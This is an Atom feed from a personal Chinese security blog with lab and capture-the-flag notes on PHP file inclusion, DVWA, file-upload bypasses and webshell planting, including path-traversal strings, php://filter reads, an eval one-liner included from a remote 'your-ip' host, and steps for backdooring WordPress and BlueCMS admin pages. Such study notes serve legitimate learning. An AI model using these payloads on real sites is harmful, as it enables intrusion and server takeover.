<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>han个人博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-09-20T04:34:10.202Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>han</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Welcome</title>
    <link href="http://yoursite.com/2019/09/20/welcome/"/>
    <id>http://yoursite.com/2019/09/20/welcome/</id>
    <published>2019-09-20T04:00:00.000Z</published>
    <updated>2019-09-20T04:34:10.202Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt -->]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;记录  学习  分享&lt;/font&gt;&lt;/center&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>文件包含漏洞与PHP伪协议</title>
    <link href="http://yoursite.com/2019/09/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2019/09/20/文件包含漏洞与PHP伪协议/</id>
    <published>2019-09-20T00:20:53.000Z</published>
    <updated>2019-09-20T00:28:46.623Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: PHP 伪协议在文件包含漏洞中的应用。</p><a id="more"></a><!--export--><!--toc--><h2 id="PHP-中支持的伪协议"><a href="#PHP-中支持的伪协议" class="headerlink" title="PHP 中支持的伪协议"></a>PHP 中支持的伪协议</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: PHP 伪协议在文件包含漏洞中的应用。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="文件包含漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="PHP伪协议" scheme="http://yoursite.com/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>php伪协议</title>
    <link href="http://yoursite.com/2019/09/19/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2019/09/19/php伪协议/</id>
    <published>2019-09-19T06:52:10.000Z</published>
    <updated>2019-09-20T04:32:43.970Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 在 <code>action</code> 测试所有的伪协议，测试 <code>DVWA</code> 的包含漏洞及获取虚拟机中的 <code>flag</code></p><a id="more"></a><!--export--><!--toc--><h3 id="测试所有伪协议"><a href="#测试所有伪协议" class="headerlink" title="测试所有伪协议"></a>测试所有伪协议</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file://绝对路径</span><br><span class="line">file://C:\\Windows\win.ini</span><br></pre></td></tr></table></figure><p>对方服务器上的路径，文件包含时，不能有后缀，如果有后缀，尝试 00 截断以及长文件名截断。</p></li><li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://指定url</span><br><span class="line">http://www.123.com/a.txt?</span><br></pre></td></tr></table></figure><p>使用 <code>?</code>或 <code>#</code> 绕过后缀，当用在 <code>include</code> 中的同时，要求 <code>php.ini</code> 文件中，<code>allow_url_include=On</code>；当用在 <code>file</code> 类函数中的同时，要求 <code>php.ini</code> 文件中，<code>allow_url_fopen=On</code></p></li><li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://</span><br><span class="line">php://input 接收到 post 数据</span><br><span class="line">php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=a.php</span><br><span class="line"><span class="comment"># 读取a.php的内容，并且base64编码，主要作用用来读php文件源代码</span></span><br></pre></td></tr></table></figure><p><code>post</code> 提交 <code>uname=zs&amp;upass=123456</code>，<code>php://input</code> 收到的内容就是 <code>name=zs&amp;upass=123456</code>，不能有后缀，当用在 <code>include</code> 中的同时，要求 <code>php.ini</code> 文件中，<code>allow_url_include=On</code> ，当用在 <code>file</code> 类函数的同时，要求 <code>php.ini</code> 文件中，<code>allow_url_fopen=On</code>。</p><p><code>php://filter</code> 可以使用相对路径，以及绝对路径，不能有后缀。当用在 <code>include</code> 中同时，要求 <code>php.ini</code> 文件中，<code>allow_url_include=On/Off</code>，当用在 <code>file</code> 类函数中，要求 <code>php.ini</code> 文件中 <code>allow_url_fopen=On/Off</code>。</p></li><li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://</span><br><span class="line">data://text/plain,abc</span><br></pre></td></tr></table></figure><p><code>data://text/plain;base64,YWJj</code>就会收到 <code>abc</code>，当用在 <code>include</code> 中，要求 <code>php.ini</code>文件中，<code>allow_url_include=On</code>，当用在 <code>file</code> 类函数中，要求 <code>php.ini</code> 文件中，<code>allow_url_fopen=On</code>。</p><p><img src="/images/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.png" alt></p><p>遇到一个网站该如何入手？</p><p><img src="/images/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png" alt></p></li></ul><h4 id="测试-action"><a href="#测试-action" class="headerlink" title="测试 action"></a>测试 action</h4><p>打开 <code>action2</code> 网页，收集信息。因为有后缀，所以无法使用 <code>file://绝对路径</code> 读取目标服务器上的文件。</p><p><img src="/images/125pro.png" alt></p><p>然后修改 <code>action=./news</code> 观察页面变化。</p><p><img src="/images/125pro1.png" alt></p><p>进入页面后，发现没有变化。故该页面可能存在文件包含漏洞。</p><p><img src="/images/125pro2.png" alt></p><p>使用 <code>php://filter/read=convert.base64-encode/resource=news</code> 看是否能读出内容。</p><p><img src="/images/125pro3.png" alt></p><p>把读出来的内容进行解码，可以获取到源码。</p><p><img src="/images/125pro4.png" alt></p><p>使用 <code>data://text/plain,abc&lt;?php phpinfo();?&gt;</code> 判断能否使用远程包含。</p><p><img src="/images/125pro5.png" alt></p><p>打开 <code>action3</code> 网页，收集信息。</p><p><img src="/images/125pro6.png" alt></p><p>使用 <code>./news</code> 判断是否可能存在文件包含漏洞。</p><p><img src="/images/125pro7.png" alt></p><p>尝试读取源码。</p><p><img src="/images/125pro8.png" alt></p><h3 id="DVWA-中的包含漏洞"><a href="#DVWA-中的包含漏洞" class="headerlink" title="DVWA 中的包含漏洞"></a>DVWA 中的包含漏洞</h3><h4 id="难度-low"><a href="#难度-low" class="headerlink" title="难度 low"></a>难度 low</h4><p>访问首页，收集信息，由下图可知该服务器系统为 <code>CentOS</code> 。</p><p><img src="/images/125dvwa1.png" alt></p><p>修改 <code>page=./include.php</code> ，观察页面的变化。</p><p><img src="/images/125dvwa2.png" alt></p><p>发现页面无变化，可能存在文件包含漏洞。直接访问 <code>/etc/passwd</code> 文件。修改 <code>page=../../../../../../etc/passwd</code>。</p><p><img src="/images/125dvwa3.png" alt></p><p>读取源码。修改 <code>page=php://filter/read=convert.base64-encode/resource=include.php</code>。</p><p><img src="/images/125dvwa4.png" alt></p><p>解码。</p><p><img src="/images/125dvwa5.png" alt></p><p>修改 <code>page=data://text/plain,abc &lt;?php phpinfo();?&gt;</code>，判断能否远程文件包含。</p><p><img src="/images/125dvwa6.png" alt></p><p>在远程服务器上放 <code>show.php</code> ，文件内容为 <code>&lt;?php phpinfo();?&gt;</code>，修改 <code>page=http://your-ip/show.php</code>，查看。</p><p><img src="/images/125dvwa7.png" alt></p><p>在远程服务器上放 <code>cmd.php</code>，文件内容为 <code>&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</code>，修改 <code>page=http://your-ip/show.php</code>，查看。</p><p><img src="/images/125dvwa8.png" alt></p><p>直接用菜刀/蚁剑连接，连接不成功。转换思路，用文件上传功能上传一个木马，然后找到它，用蚁剑连接即可。</p><p>先上传一个正常的图片，发现可以看见路径。很明显该路径为相对路径。</p><p><img src="/images/125dvwa9.png" alt></p><p>把 <code>url</code> 和路径拼接起来，</p><p><img src="/images/125dvwa10.png" alt></p><p>确定后，看到图片，并且上传图片的路径也清晰明了。</p><p><img src="/images/125dvwa11.png" alt></p><p>上传一个木马，用菜刀/蚁剑连接。</p><p><img src="/images/125dvwa12.png" alt></p><p>根据前面查到的路径，直接连接。</p><p><img src="/images/125dvwa13.png" alt></p><h4 id="难度-medium"><a href="#难度-medium" class="headerlink" title="难度 medium"></a>难度 medium</h4><p>访问 <code>./include.php</code>，故可能存在文件包含。</p><p><img src="/images/125dvwa14.png" alt></p><p>修改 <code>page=../../../../../etc/passwd</code></p><p><img src="/images/125dvwa15.png" alt></p><p>改为 <code>page=/etc/passwd</code> 可以取得内容。</p><p><img src="/images/125dvwa16.png" alt></p><p>再次修改 <code>page=....//....//....//....//....//....//etc/passwd</code>，可以得到内容，所以程序很可能对敏感字符做了处理，但是可以通过双拼绕过。</p><p><img src="/images/125dvwa19.png" alt></p><p>修改 <code>page=php://filter/read=convert.base64-encode/resource=include.php</code>，查看源码。</p><p><img src="/images/125dvwa17.png" alt></p><p>解码可得源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if the right PHP functions are enabled</span></span><br><span class="line">$WarningHtml = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>( !ini_get( <span class="string">'allow_url_include'</span> ) ) &#123;</span><br><span class="line">$WarningHtml .= <span class="string">"&lt;div class=\"warning\"&gt;The PHP function &lt;em&gt;allow_url_include&lt;/em&gt; is not enabled.&lt;/div&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( !ini_get( <span class="string">'allow_url_fopen'</span> ) ) &#123;</span><br><span class="line">$WarningHtml .= <span class="string">"&lt;div class=\"warning\"&gt;The PHP function &lt;em&gt;allow_url_fopen&lt;/em&gt; is not enabled.&lt;/div&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page[ <span class="string">'body'</span> ] .= <span class="string">"</span></span><br><span class="line"><span class="string">&lt;div class=\"body_padded\"&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;Vulnerability: File Inclusion&lt;/h1&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;$WarningHtml&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;div class=\"vulnerable_code_area\"&gt;</span></span><br><span class="line"><span class="string">[&lt;em&gt;&lt;a href=\"?page=file1.php\"&gt;file1.php&lt;/a&gt;&lt;/em&gt;] - [&lt;em&gt;&lt;a href=\"?page=file2.php\"&gt;file2.php&lt;/a&gt;&lt;/em&gt;] - [&lt;em&gt;&lt;a href=\"?page=file3.php\"&gt;file3.php&lt;/a&gt;&lt;/em&gt;]</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;h2&gt;More Information&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;"</span> . dvwaExternalLinkUrlGet( <span class="string">'https://en.wikipedia.org/wiki/Remote_File_Inclusion'</span> ) . <span class="string">"&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;"</span> . dvwaExternalLinkUrlGet( <span class="string">'https://www.owasp.org/index.php/Top_10_2007-A3'</span> ) . <span class="string">"&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改 <code>page=data://text/plain,abc &lt;?php phpinfo();?&gt;</code>，查看页面。</p><p><img src="/images/125dvwa18.png" alt></p><p>修改 <code>page=http://your-ip/show.php</code> ，利用远程包含，发现没有显示内容。</p><p><img src="/images/125dvwa20.png" alt></p><p>由于 <code>php://filter</code> 和 <code>data://</code>都显示内容了，所以很可能对 <code>http</code> 这四个字符做了处理。尝试了 <code>http</code> 字符多个位置双拼都不行，可能是对 <code>http://</code> 做了处理，尝试下 <code>httphttp://://</code> ，发现可以绕过。修改 <code>page=httphttp://://your-ip/show.php</code>。查看页面。</p><p><img src="/images/125dvwa21.png" alt></p><h4 id="难度-high"><a href="#难度-high" class="headerlink" title="难度 high"></a>难度 high</h4><p>修改 <code>page=./include.php</code>。</p><p><img src="/images/125dvwa22.png" alt></p><h3 id="获取虚拟机中的-flag"><a href="#获取虚拟机中的-flag" class="headerlink" title="获取虚拟机中的 flag"></a>获取虚拟机中的 flag</h3><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">$a=<span class="keyword">isset</span>($_GET[<span class="string">"a"</span>])?$_GET[<span class="string">"a"</span>]:<span class="string">''</span>;</span><br><span class="line">$b=<span class="keyword">isset</span>($_GET[<span class="string">"b"</span>])?$_GET[<span class="string">"b"</span>]:<span class="string">''</span>;</span><br><span class="line">$c=<span class="keyword">isset</span>($_GET[<span class="string">"c"</span>])?$_GET[<span class="string">"c"</span>]:<span class="string">''</span>;</span><br><span class="line">$d=<span class="keyword">isset</span>($_GET[<span class="string">"d"</span>])?$_GET[<span class="string">"d"</span>]:<span class="string">''</span>;</span><br><span class="line">$e=<span class="keyword">isset</span>($_GET[<span class="string">'e'</span>])?$_GET[<span class="string">'e'</span>]:<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/php/i'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"This not allow pseudo protocol!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\.\./'</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"This also not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((@file_get_contents($a,<span class="string">'r'</span>)===$b)&amp;&amp;(@file_get_contents($e,<span class="string">'r'</span>)===<span class="string">"I'm Administrator!"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$c))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="comment">// get class.php</span></span><br><span class="line">        @<span class="keyword">include</span>($c);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! &lt;br&gt;"</span>;</span><br><span class="line">&#125; </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>简单的流程图</p><p><img src="/images/125dvwa23.png" alt></p><p>对 <code>a</code> 使用远程包含的方法输入值，对 <code>b</code> 直接输入值，对 <code>e</code> 使用与 <code>a</code> 相同的方法。</p><p><img src="/images/125dvwa25.png" alt></p><p>成功绕过，但是依然无法访问 <code>flag.php</code>。</p><p><img src="/images/125dvwa26.png" alt></p><p>查看 <code>robots.txt</code> 文件。</p><p><img src="/images/125dvwa27.png" alt></p><p>用 <code>c=php://filter/read=convert.base64-encode/resource=class.php</code>，查看 <code>class.php</code> 源码。</p><p><img src="/images/125dvwa28.png" alt></p><p>解码，可得 <code>class.php</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#class.php</span></span><br><span class="line"></span><br><span class="line">$m1 = $_GET[<span class="string">'m1'</span>];</span><br><span class="line">$m2 = $_GET[<span class="string">'m2'</span>];</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (md5($m1) == md5($m2) &amp;&amp; $m1 != $m2) &#123;</span><br><span class="line">    <span class="comment"># cat flag.php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Place cat flag !"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/cat/i'</span>, $cmd)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用 <code>php md5 解密漏洞</code>。</p><p><img src="/images/125dvwa29.png" alt></p><p>绕过 <code>waf</code>。</p><p><img src="/images/125dvwa30.png" alt></p><p>查看源码，获取 <code>flag{danjfb-asdfss-vsdfsa-fdsdaf-cvfsfa}</code>。</p><p><em>参考文章</em></p><blockquote><p>[<a href="https://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="noopener">PHP处理0e开头md5哈希字符串缺陷/bug</a>]</p><p><a href="https://www.cnblogs.com/piaomiaohongchen/p/10659359.html" target="_blank" rel="noopener">[php中的md5()的安全问题]</a></p><p><a href="[https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/](https://www.smi1e.top/文件包含漏洞与php伪协议/)">文件包含漏洞与PHP伪协议</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 在 &lt;code&gt;action&lt;/code&gt; 测试所有的伪协议，测试 &lt;code&gt;DVWA&lt;/code&gt; 的包含漏洞及获取虚拟机中的 &lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="PHP 伪协议" scheme="http://yoursite.com/tags/PHP-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>PHP 文件包含简单利用</title>
    <link href="http://yoursite.com/2019/09/18/phpInclude/"/>
    <id>http://yoursite.com/2019/09/18/phpInclude/</id>
    <published>2019-09-18T08:34:23.000Z</published>
    <updated>2019-09-18T23:57:08.670Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 文件包含简单应用</p><a id="more"></a><!--export--><!--toc--><h3 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">action</span><br><span class="line">|    action.php</span><br><span class="line">|    action1.php</span><br><span class="line">|    action2.php</span><br><span class="line">|    action3.php</span><br><span class="line">|    index.php</span><br><span class="line">|    news.jpg</span><br><span class="line">|    readme.txt</span><br></pre></td></tr></table></figure><h3 id="服务器部署环境"><a href="#服务器部署环境" class="headerlink" title="服务器部署环境"></a>服务器部署环境</h3><p>打开首页，收集信息。</p><p><img src="/images/124action1.png" alt></p><h3 id="直接包含"><a href="#直接包含" class="headerlink" title="直接包含"></a>直接包含</h3><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>点击 <code>php include</code>，进入第一关，源码已显示出来。</p><p><img src="/images/124action2.png" alt></p><p>程序未对输入参数 <code>action</code> 做任何处理，修改 <code>action=../../../../../../Windows/system.ini</code>，观察页面变化。</p><p><img src="/images/124action3.png" alt></p><p>可以看到已读取到 <code>system.ini</code>。返回首页查看图片地址，</p><p><img src="/images/124action4.png" alt></p><p>图片马和 <code>news.php</code> 在同一目录下。修改 <code>action</code> 的值，读取图片马。</p><p><img src="/images/124action5.png" alt></p><p>用蚁剑连接，连接成功。</p><p><img src="/images/124action6.png" alt></p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p><strong>注意</strong>：需设置 <code>php.ini</code> 文件中 <code>allow_url_include=On</code>。</p><p>由源码可知，未对传入参数做任何处理所以可以使用远程包含。在自己搭建的服务器上存放一个图片马，修改 <code>action</code> 的值。</p><p><img src="/images/124action7.png" alt></p><p>尝试用蚁剑连接，</p><p><img src="/images/124action8.png" alt></p><h3 id="限制路径"><a href="#限制路径" class="headerlink" title="限制路径"></a>限制路径</h3><p>打开 <code>php include 1</code> </p><p><img src="/images/124action9.png" alt></p><p>可以看出来，对包含的文件做了限制路径的操作。这时远程文件包含无法使用。修改 <code>action</code> 的值。</p><p><img src="/images/124action10.png" alt></p><p>用蚁剑连接，</p><p><img src="/images/124action12.png" alt></p><h3 id="限制后缀"><a href="#限制后缀" class="headerlink" title="限制后缀"></a>限制后缀</h3><p>打开<code>php include 2</code>，</p><p><img src="/images/124action13.png" alt></p><h4 id="本地包含-1"><a href="#本地包含-1" class="headerlink" title="本地包含"></a>本地包含</h4><p><strong>注意</strong>：需要把 <code>magic_quote_gpc=Off</code></p><p>用  <code>burpsuite</code> 抓包，</p><p><img src="/images/124action14.png" alt></p><p>点击 <code>Forward</code>。</p><p><img src="/images/124action15.png" alt></p><p>查看本地文件，</p><p><img src="/images/124action16.png" alt></p><p>显示结果</p><p><img src="/images/124action17.png" alt></p><h4 id="远程包含-1"><a href="#远程包含-1" class="headerlink" title="远程包含"></a>远程包含</h4><p><img src="/images/124action18.png" alt></p><p>蚁剑连接</p><p><img src="/images/124action19.png" alt></p><h3 id="限制路径和限制后缀结合"><a href="#限制路径和限制后缀结合" class="headerlink" title="限制路径和限制后缀结合"></a>限制路径和限制后缀结合</h3><p>限制路径后无法使用远程包含</p><p>打开 <code>php include 3</code></p><p><img src="/images/124action20.png" alt></p><p>使用 <code>%00</code> 截断，</p><p><img src="/images/124action21.png" alt></p><p>显示 <code>news.jpg</code></p><p><img src="/images/124action22.png" alt></p><p>蚁剑连接</p><p><img src="/images/124action23.png" alt></p><h3 id="XP-系统文件路径长度截断"><a href="#XP-系统文件路径长度截断" class="headerlink" title="XP 系统文件路径长度截断"></a>XP 系统文件路径长度截断</h3><p><code>action2</code> 可以截断</p><p><img src="/images/124action24.png" alt></p><p><code>action3</code> 不能截断</p><p><img src="/images/124action25.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 文件包含简单应用&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="文件包含漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞总结</title>
    <link href="http://yoursite.com/2019/09/17/uploadsum/"/>
    <id>http://yoursite.com/2019/09/17/uploadsum/</id>
    <published>2019-09-17T11:34:54.000Z</published>
    <updated>2019-09-18T00:58:38.597Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 总结文件上传漏洞，包括常规的上传绕过，编辑器漏洞，各种获取webshell的手段。</p><a id="more"></a><!--export--><!--toc--><h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><h3 id="常规的上传绕过"><a href="#常规的上传绕过" class="headerlink" title="常规的上传绕过"></a>常规的上传绕过</h3><h4 id="前期工作"><a href="#前期工作" class="headerlink" title="前期工作"></a>前期工作</h4><p>判断类型</p><img src="/images/如何判断上传漏洞类型.png" style="zoom:200%;"><h4 id="根据类型运用具体方法绕过"><a href="#根据类型运用具体方法绕过" class="headerlink" title="根据类型运用具体方法绕过"></a>根据类型运用具体方法绕过</h4><img src="/images/文件上传测试.png" style="zoom:200%;"><h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><img src="/images/FCKeditor 编辑器漏洞利用总结.png" style="zoom:200%;"><h3 id="获取-webshell-的手段"><a href="#获取-webshell-的手段" class="headerlink" title="获取 webshell 的手段"></a>获取 webshell 的手段</h3><h4 id="通过文件上传漏洞和编辑器漏洞上传-webshell"><a href="#通过文件上传漏洞和编辑器漏洞上传-webshell" class="headerlink" title="通过文件上传漏洞和编辑器漏洞上传 webshell"></a>通过文件上传漏洞和编辑器漏洞上传 webshell</h4><h5 id="直接上传获得-webshell"><a href="#直接上传获得-webshell" class="headerlink" title="直接上传获得 webshell"></a>直接上传获得 webshell</h5><p><code>php</code> 和 <code>jsp</code> 程序比较常见，直接在管理界面上传 <code>.php</code> 或 <code>.jsp</code> 类型。</p><h5 id="添加修改上传类型"><a href="#添加修改上传类型" class="headerlink" title="添加修改上传类型"></a>添加修改上传类型</h5><p>大多数系统是允许添加上传类型，登录后台可以添加相应类型的 <code>webshell</code>，<code>asp</code> 后台可以添加 <code>asa</code>  、<code>asP</code> 或 <code>.aspasp</code> 类型的 <code>webshell</code>，<code>php</code> 系统的后台，可以添加 <code>.php.未知文件类型</code>。</p><h4 id="后台获取-webshell-常用方法"><a href="#后台获取-webshell-常用方法" class="headerlink" title="后台获取 webshell 常用方法"></a>后台获取 webshell 常用方法</h4><h5 id="利用后台管理功能写入-webshell"><a href="#利用后台管理功能写入-webshell" class="headerlink" title="利用后台管理功能写入 webshell"></a>利用后台管理功能写入 webshell</h5><p>打开管理功能，编辑 <code>php</code> 文件，把小马写入。这种方法难在确认小马所在路径上。</p><ol><li><p><code>wordpress</code> 后台登入后，进入主题修改里面，在 <code>404.php</code> 文件里加上小马，根据浏览器的 <code>url</code> ，拼凑路径，<code>/themes/popularis/404.php</code> 。然后通过两次安装相同的插件，系统就会报出已在 <code>/var/www/html/wp-content/plugins</code> 安装的错误，来确定根目录。最后我们把整个路径拼接起来，即访问，<code>http://YouIp/wp-content/themes/popularis/404.php</code>。整个过程要多注意细节，多尝试。</p></li><li><p><code>BlueCMS</code> 后台登入后，进入管理界面，在 <code>html</code> 编辑功能中，右击编辑字体可以进入到编辑页面，<code>url</code>  中存在着文件的路径，可以用 <code>file=../../../../../../../../../../../etc/passwd</code> 的方法来查看是否可行，输入后服务器目录中 <code>/etc/passwd</code> 显示出来，可以通过这种方法确定路径。</p><p>一般情况会在网站根目录下存在 <code>admin</code> 文件夹和普通用户的执行文件，<code>admin</code> 文件夹里面存放着管理员登录后的执行文件，这个我们可以通过 <code>url</code> 判断，比如 <code>www.xxx.org/admin/xxx.php</code> 。我们可以以普通用户查看网页，在网页找到某个 <code>abc.php</code> 文件，然后让 <code>file=../abc.php</code>看是否成功，不成功的话可以继续尝试 <code>file=../../abc.php</code>。显示成功后，把一句话木马加上。然后用菜刀按照上次确定的路径连接即可。</p><p>除此之外，还可以用 <code>burpsuite</code> 抓包方法创建 <code>.php</code>文件，在管理界面，编辑执行文件，点击提交时，用软件抓包，修改文件名为 <code>xxx.php</code> ，把文件内容改为一句话木马。之后在通过 <code>index.html</code> 文件找到文件路径。</p></li></ol><h5 id="利用后台管理向配置文件写-webshell"><a href="#利用后台管理向配置文件写-webshell" 